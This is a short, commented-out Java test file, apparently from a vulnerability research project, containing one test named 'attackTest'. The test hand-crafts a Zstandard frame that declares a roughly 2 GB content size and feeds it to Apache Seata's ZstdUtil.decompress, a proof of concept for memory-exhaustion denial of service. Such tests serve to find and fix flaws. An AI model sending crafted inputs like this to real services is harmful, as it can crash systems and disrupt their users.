//package edu.fudan.gluttony;
//
//import org.apache.seata.compressor.zstd.ZstdUtil;
//import org.junit.Test;
//
///**
// * User: luca
// * Date: 2024/10/23
// * Description:
// */
//public class CaseTest {
//    @Test
//    public void attackTest(){
//        byte[] bytes = new byte[11];
//        bytes[0] = (byte) 0x28;
//        bytes[1] = (byte) 0xB5;
//        bytes[2] = (byte) 0x2F;
//        bytes[3] = (byte) 0xFD; // magic number
//
//        bytes[4] = (byte) 0xA0; // Frame Header_Descriptor
//
//        bytes[5] = (byte) 0xFF; // Frame Content Size
//        bytes[6] = (byte) 0xFF;
//        bytes[7] = (byte) 0xFF;
//        bytes[8] = (byte) 0x7F;
//
//        bytes[9] = (byte) 0x60;
//        bytes[10] = (byte) 0x44;
//        ZstdUtil.decompress(bytes);
//
//    }
//}
